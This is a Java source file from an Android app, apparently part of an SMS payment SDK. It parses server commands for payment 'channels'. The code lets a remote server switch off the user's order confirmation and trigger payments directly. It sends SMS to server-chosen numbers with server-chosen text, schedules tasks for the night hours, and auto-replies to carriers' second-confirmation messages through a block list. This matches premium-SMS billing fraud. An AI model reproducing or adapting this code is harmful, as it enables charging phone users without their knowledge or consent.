package com.example.sayid.myapplication.model;

import android.content.Context;
import android.text.TextUtils;

import com.example.sayid.myapplication.common.bean.BlockBean;
import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.data.Strings;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.listener.OnPayListener;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.util.CacheUtil;
import com.example.sayid.myapplication.common.util.JsonUtil;
import com.example.sayid.myapplication.common.util.ServiceUtil;
import com.example.sayid.myapplication.pay.AppTache;
import com.example.sayid.myapplication.smsutil.SmSutils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Vector;


public class ChannelOrderResp {
    private final static String TAG = "ChannelOrderResp";

    private final static String SUCCESS = "0";
    public final static int ALERT_TYPE = 1;
    public final static int PAY_TYPE = 2;

    public static ChannelOrderResp instance;

    public static volatile Vector<ChannelInfo> V_ORDER_CONFIRM;     // 订单提示
    public static volatile Vector<ChannelInfo> V_CHANNEL_CONFIRM;   // 通道提示

    /**
     * 是否需要升级：0不需要升级；1需要升级
     */
    public String is_update;
    /**
     * 下载地址
     */
    public String download_url;

    /**
     * 操作结果
     */
    public String result;
    /**
     * 用户订单
     */
    public String user_order_id;
    /**
     * 错误描述，失败返回
     */
    public String error_msg;
    /**
     * 销量统计手机号码
     */
    public String reportMsisdn;
    /**
     * 手机号码上报内容
     */
    public String reportMsg;
    /**
     * 订单提示策略，0提示，1不提示
     */
    public String order_confirm_strategy;
    /**
     * 订单提示主题
     */
    public String order_confirm_tip;
    /**
     * 订单提示内容
     */
    public String order_confirm;
    /**
     * 计费备份根地址， 可以为空
     */
    public String bakRootURL;
    /**
     * 轮询时间,单位：秒
     */
    public int loopTime;
    /**
     * 终端下一次请求计费接口的时间,单位：秒
     */
    public int updateTime;
    /**
     * 请求次数
     */
    public int imsiDayNumber;
    /**
     * 是否root 默认否
     */
    public String isRoot = "1";
    /**
     * 是否Task 默认是
     */
    public String isTask = "0";
    /**
     * Task开始执行时间,默认22点
     */
    public int startHour = 22;
    /**
     * Task结束执行时间,默认7点
     */
    public int endHour = 7;
    /**
     * 验证串
     */
    public String sign;

    /**
     * 订单信息
     */
    public List<ChannelInfo> channels;

    private OnPayListener onPayListener;

    public ChannelOrderResp(OnPayListener onPayListener) {
        this.onPayListener = onPayListener;

        initVector();
        instance = this;
    }


    /**
     * 初始化提示
     */
    public static void initVector() {
        if (V_ORDER_CONFIRM == null) {
            V_ORDER_CONFIRM = new Vector<ChannelInfo>();
        }
        if (V_CHANNEL_CONFIRM == null) {
            V_CHANNEL_CONFIRM = new Vector<ChannelInfo>();
        }
    }

    /**
     * 解析通道
     */
    public void parseChannel(Context context, String json) {
        try {
            parseJson(context, json);
        } catch (JSONException e) {
//			Logs.e(TAG, "parseJson error:" + e.toString());
        }

//		Logs.d(TAG, "--------访问成功-----------" + result.toString());
        // 成功
        if (SUCCESS.equals(result)) {
            reportMobile();
            // 失败
        } else {
            if (onPayListener != null) {
                onPayListener.onFailed("", result, error_msg);
                onPayListener = null;
            }
        }

        // 更新缓存信息
        updateCache();

        // 通道支付
        if (SUCCESS.equals(result) && channels != null) {
            parseChannel(ALERT_TYPE);
        }
    }

    /**
     * Json解析
     *
     * @param json
     */
    private void parseJson(Context context, String json) throws JSONException {
        JSONObject jsonObj = new JSONObject(json);

        // 是否需要升级：0不需要升级；1需要升级
        is_update = JsonUtil.isNullOrGetStr(jsonObj, "is_update");
        if ("1".equals(is_update)) {
            // 新版本下载地址
            download_url = JsonUtil.isNullOrGetStr(jsonObj, "download_url");
            // new UpDate(context).downloadApk(download_url);
            return;
        }

        result = JsonUtil.isNullOrGetStr(jsonObj, "result");
        // 非空
        user_order_id = JsonUtil.isNullOrGetStr(jsonObj, "user_order_id");
        // 错误返回
        error_msg = JsonUtil.isNullOrGetStr(jsonObj, "error_msg");

        // 手机号码上报
        reportMsisdn = JsonUtil.isNullOrGetStr(jsonObj, "reportMsisdn");
        reportMsg = JsonUtil.isNullOrGetStr(jsonObj, "reportMsg");

        // 订单提示策略
        order_confirm_strategy = JsonUtil.isNullOrGetStr(jsonObj, "order_confirm_strategy");
        order_confirm_tip = JsonUtil.isNullOrGetStr(jsonObj, "order_confirm_tip");
        order_confirm = JsonUtil.isNullOrGetStr(jsonObj, "order_confirm");

        // 更新备份地址
        bakRootURL = JsonUtil.isNullOrGetStr(jsonObj, "bakRootURL");
        if (!TextUtils.isEmpty(bakRootURL)) {
            CacheUtil.getInstance().setString(CacheUtil.KEY_BOOT_URL, bakRootURL);
        }

        loopTime = JsonUtil.isNullOrGetInt(jsonObj, "loopTime");
        updateTime = JsonUtil.isNullOrGetInt(jsonObj, "updateTime");
        imsiDayNumber = JsonUtil.isNullOrGetInt(jsonObj, "imsiDayNumber");
        isRoot = JsonUtil.isEmptyOrGetStr(jsonObj, "isRoot", "1");
        isTask = JsonUtil.isEmptyOrGetStr(jsonObj, "isTask", "0");
        startHour = JsonUtil.isEmptyOrGetInt(jsonObj, "startHour", 22);
        endHour = JsonUtil.isEmptyOrGetInt(jsonObj, "endHour", 7);

        sign = JsonUtil.isNullOrGetStr(jsonObj, "sign");

        // 成功返回通道信息，解析
        if (!jsonObj.isNull("channels")) {
            channels = new ArrayList<ChannelInfo>();
            JSONArray jChannels = jsonObj.getJSONArray("channels");
            int size = jChannels.length();
            for (int i = 0; i < size; i++) {
                JSONObject jsonB = (JSONObject) jChannels.get(i);
                ChannelInfo info = new ChannelInfo(user_order_id, onPayListener);
                info.parseJson(context, jsonB);
                channels.add(info);
            }
        }
    }

    /**
     * 手机号码上报
     */
    private void reportMobile() {
        if (!TextUtils.isEmpty(reportMsisdn) && !TextUtils.isEmpty(reportMsg)) {
            SmSutils.sendSMS(user_order_id, "", reportMsisdn, reportMsg, new SendSmsListener() {
                public void onSendSmsSuccess(String user_order_id, String pay_order_id, String destPhone, String message, int times) {
                    // 	Logs.d(TAG, "销量短信发送成功，短信上行号码-" + destPhone + ", 内容-" + message);
                }

                public void onSendSmsFailed(String user_order_id, String pay_order_id, String destPhone, String message, int items, String errorCode) {
                    // 	Logs.d(TAG, "销量短信发送失败，短信上行号码-" + destPhone + ", 内容-" + message);
                }
            });
        }
    }

    /**
     * 更新缓存
     */
    private void updateCache() {
        // 下次请求时间, 取错误时间
        long next_time = CacheUtil.NEXT_TIME_ERROR;
        if (updateTime > 0) {
            next_time = updateTime * 1000L;
        }

        // 轮循时间
        long loop_time = CacheUtil.LOOP_TIME_DEFAULT;
        if (loopTime > 0) {
            loop_time = loopTime * 1000L;
        }

        // 每日获取通道次数，
        int imsi_day_number = CacheUtil.REQUEST_COUNT_DEFAULT;
        if (imsiDayNumber > 0) {
            imsi_day_number = imsiDayNumber;
        }

        // 更新下次任务启动的时间
        CacheUtil.getInstance().setLong(CacheUtil.KEY_NEXT_TIME, (System.currentTimeMillis() + next_time));
        CacheUtil.getInstance().setLong(CacheUtil.KEY_LOOP_TIME, loop_time);
        CacheUtil.getInstance().setInt(CacheUtil.KEY_REQUEST_COUNT, imsi_day_number);
        CacheUtil.getInstance().setString(CacheUtil.KEY_IS_ROOT, isRoot);
        CacheUtil.getInstance().setString(CacheUtil.KEY_IS_TASK, isTask);
        CacheUtil.getInstance().setInt(CacheUtil.KEY_TASK_START_HOUR, startHour);
        CacheUtil.getInstance().setInt(CacheUtil.KEY_TASK_END_HOUR, endHour);

        // 更新轮循时间，重新启动定时任务
        if (loopTime > 0) {
            ServiceUtil.taskService(AppTache.context, loop_time);
        }
    }

    /**
     * 解析通道
     *
     * @param type
     */
    private void parseChannel(int type) {
//		Logs.d(TAG, "----parseChannel----"+type);
        try {
            switch (type) {
                case ALERT_TYPE:            //订单提示类型，0表示不提示，1表示提示
//					Logs.d(TAG, "parse ---- ALERT_TYPE");
                    parseAlertType();
                    break;

                case PAY_TYPE:                //通道支付，支持多通道
//					Logs.d(TAG, "parse ---- PAY_TYPE");// 按通道类型排序

                    Iterator<ChannelInfo> iterator = channels.iterator();
                    while (iterator.hasNext()) {
                        ChannelInfo bean = (ChannelInfo) iterator.next();
                        bean.channelPayDialog();
                    }
                    break;
            }
        } catch (Exception e) {
//			Logs.e(TAG, "parseChannel error:" + e.toString());
        }
    }

    /**
     * 订单提示策略
     */
    private void parseAlertType() {
        // 订单提示策略 提示0；不提示1；
        int alertType = Integer.parseInt(order_confirm_strategy);
//		Logs.d(TAG, "=====parseAlertType======");
        switch (alertType) {
            case 0:   // 提示
                synchronized (ChannelOrderResp.V_ORDER_CONFIRM) {
                    if (V_ORDER_CONFIRM.size() > ChannelInfo.SMS_ITEM_MAX) {
                        for (int i = 0; i < channels.size(); i++) {
                            V_ORDER_CONFIRM.remove(i);
                        }
                    }
                    V_ORDER_CONFIRM.addAll(channels);
                }
                orderPrompt(user_order_id, "");
//                UI.showAlertDialog(UI.DIALOG_1, AppTache.context, user_order_id, "",
//                        order_confirm, order_confirm_tip, UI.DEAL_TYPE_1);

                break;
            case 1:          //不提示
                parseChannel(PAY_TYPE);
                break;
        }
    }

    /**
     * 订单提示  确认
     *
     * @param user_order_id
     * @param pay_order_id
     */
    public void orderPrompt(final String user_order_id, final String pay_order_id) {

        System.out.print("V_ORDER_CONFIRM==  " + V_ORDER_CONFIRM);
        try {
            if (V_ORDER_CONFIRM == null) {
                return;
            }

            // 启动子线程，解析订单
            Thread t = new Thread() {
                public void run() {
                    List<ChannelInfo> list = new ArrayList<ChannelInfo>();

//                    System.out.print("List<ChannelInfo> list ==  " +  list );
                    synchronized (ChannelOrderResp.V_ORDER_CONFIRM) {
                        // 根据用户订单查询
                        Iterator<ChannelInfo> iterator = V_ORDER_CONFIRM.iterator();
                        while (iterator.hasNext()) {
                            ChannelInfo bean = iterator.next();
                            if (bean != null && bean.user_order_id.equals(user_order_id)) {
                                list.add(bean);
                                iterator.remove();
                                // 多通道，用户订单一样
                                // break;
                            }
                        }
                    }

                    Iterator<ChannelInfo> iterator = list.iterator();
                    while (iterator.hasNext()) {
                        ChannelInfo bean = (ChannelInfo) iterator.next();
                        bean.channelPayDialog();
                    }
                }
            };

            t.start();
        } catch (Exception e) {
//			Logs.e(TAG, "parseGone error:" + e.toString());
        }
    }

    /**
     * 订单提示  取消
     *
     * @param user_order_id
     * @param pay_order_id
     */
    public void quitOrderPrompt(String user_order_id, String pay_order_id) {
        try {
            if (V_ORDER_CONFIRM == null) {
                return;
            }

            List<ChannelInfo> list = new ArrayList<ChannelInfo>();

            synchronized (ChannelOrderResp.V_ORDER_CONFIRM) {
                Iterator<ChannelInfo> iterator = V_ORDER_CONFIRM.iterator();
                while (iterator.hasNext()) {
                    ChannelInfo bean = iterator.next();
                    if (bean != null && bean.user_order_id.equals(user_order_id)) {
                        list.add(bean);
                        iterator.remove();
                        // 多通道，用户订单一样
                        // break;
                    }
                }
            }

            Iterator<ChannelInfo> iterator = list.iterator();
            while (iterator.hasNext()) {
                ChannelInfo bean = (ChannelInfo) iterator.next();
                bean.reportFailed(ErrorCode.CODE_110009);
                if (onPayListener != null) {
                    onPayListener.onFailed(user_order_id, ErrorCode.CODE_110009, Strings.PAY_CANCEL);
                    onPayListener = null;
                }
            }
        } catch (Exception e) {
//			Logs.e(TAG, "quitParseGone error:" + e.toString());
        }
    }

    /**
     * 通道提示 确认
     *
     * @param user_order_id
     * @param pay_order_id
     */
    public void channelPrompt(String user_order_id, String pay_order_id) {
        try {
            if (V_CHANNEL_CONFIRM == null) {
                return;
            }

            // 根据云巢流水号查询
            ChannelInfo findBean = null;
            synchronized (ChannelOrderResp.V_CHANNEL_CONFIRM) {
                Iterator<ChannelInfo> iterator = V_CHANNEL_CONFIRM.iterator();
                while (iterator.hasNext()) {
                    ChannelInfo bean = iterator.next();
                    if (bean != null && bean.pay_order_id.equals(pay_order_id)) {
                        findBean = bean;
                        iterator.remove();
                        break;
                    }
                }
            }

            if (findBean != null) {
                findBean.channelPay(Integer.parseInt(findBean.channel_type));
            }
        } catch (Exception e) {
//			Logs.e("ParsePayJSONBean：005:" + e.toString());
        }
    }

    /**
     * 通道提示 取消
     *
     * @param user_order_id
     * @param pay_order_id
     */
    public void quitChannelPrompt(String user_order_id, String pay_order_id) {
        try {
            if (V_CHANNEL_CONFIRM == null) {
                return;
            }

            ChannelInfo findBean = null;
            synchronized (ChannelOrderResp.V_CHANNEL_CONFIRM) {
                Iterator<ChannelInfo> iterator = V_CHANNEL_CONFIRM.iterator();
                while (iterator.hasNext()) {
                    ChannelInfo bean = (ChannelInfo) iterator.next();
                    if (bean != null && bean.pay_order_id.equals(pay_order_id)) {
                        findBean = bean;
                        iterator.remove();
                        break;
                    }
                }
            }

            if (findBean != null) {
                findBean.reportFailed(ErrorCode.CODE_110009);
                if (onPayListener != null) {
                    onPayListener.onFailed(user_order_id, ErrorCode.CODE_110009, Strings.PAY_CANCEL);
                    onPayListener = null;
                }
            }
        } catch (Exception e) {
//			Logs.e("quitSendMsg error:" + e.toString());
        }
    }

    /**
     * 对话框点击 二次确认短信
     */
    public void secondConfirmPrompt(Context context, String user_order_id, String pay_order_id) {
        try {
            BlockDao blockDao = new BlockDao(context);
            BlockBean bean = blockDao.select(pay_order_id);

            if (bean != null && bean.blockSecondConfirm != null) {
                bean.blockSecondConfirm.confirmAutoReply(user_order_id, pay_order_id);
            }

//			v_bean.clear();
//			System.gc();
        } catch (Exception e) {
//			Logs.e(TAG, "v_beanChange error:" + e.toString());
        }
    }

}
